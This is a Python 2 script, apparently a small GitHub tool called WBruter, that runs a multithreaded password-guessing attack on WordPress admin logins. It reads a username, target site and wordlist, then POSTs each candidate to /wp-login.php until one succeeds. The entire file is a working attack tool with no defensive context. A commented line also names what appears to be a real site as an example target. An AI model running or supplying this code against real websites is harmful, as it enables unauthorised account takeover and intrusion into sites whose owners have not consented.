import httplib, urllib
import time
import sys
from threading import Thread

print "##################################################################"
print "################       WBruter\'s                  ###############"
print "##################################################################"
print "### Version 0.1b"
print "### Author: brenoman"
print "### Github.com/brenoman"
print "##################################################################"

print "\n\nType in the login\n"
login = raw_input()
senha = "senha"
print "\nType in the website (this will assume /wp-login.php as entry point)\n"
site = raw_input()
print "\nType in the redirection page\n"
redirecionamento = raw_input()
print "\nType in the wordlist path\n"
wordlist = raw_input()
print "\nHow many threads?\n"
threads = raw_input()
threads = int(threads) - 1

print "\n\nThis will now divide the work among the threads.. be patient this can take a while depending on the wordlist size\n\n"

#redirecionamento = "http%3A%2F%2Fimextintas.com.br%2Fwp-admin%2F"
achou = False
senhaAchada = ""
contadorTentativas = 0

def vai(lista, numeroThread):
    global achou
    global senhaAchada
    global contadorTentativas
    global site
    i=0
    for line in lista:
        try:
            h1 = httplib.HTTPConnection(site)
            if (achou==True):
                print "\nThread "+str(numeroThread)+" - Found password: "+senhaAchada+", killing thread\n"
                return
            line = line.rstrip('\n')
            senha = line
            params = urllib.urlencode({'log': login, 'pwd': senha, 'redirect_to': redirecionamento})
            headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
            h1.request("POST", "/wp-login.php", params, headers)
            resposta = h1.getresponse()
            data = resposta.read()
            print "\nThread "+str(numeroThread)+" - attempt " + str(contadorTentativas) + " -- STATUS: " + str(resposta.status) + "\n"
	    if (resposta.status != 200):
                print "Ops... no 200 response..."
                continue
            if "ERR" in data:
                print "\nThread "+str(numeroThread)+" - Wrong Password ("+senha+")\n"
            else:
                print "\nThread "+str(numeroThread)+" - GOT IT! Password: " + senha + "\n"
                achou=True
                senhaAchada = senha
                return senha
                break
            contadorTentativas = contadorTentativas+1
            i = i+1
            h1.close()
        except:
            print "\nf*king Error: ", sys.exc_info()[0]
            h1.close()
            pass
    


### PARTE DE DIVISAO DO TRABALHO
count=0
with open (wordlist,'rb') as f:
    for line in f:
        count+=1

divisao = count/threads
#print "divisao : " + str(divisao)
lista = [[]]
for i in range(threads):
    lista.append([])
print lista
i=1
x=1
with open (wordlist,'rb') as f:
    for line in f:
        if (i==x*divisao):
            x=x+1
            print x
        lista[x-1].append(line)
        i=i+1
k=0
for l in lista:
    t = Thread(target=vai, args=(l,k))
    k=k+1
    t.start() 

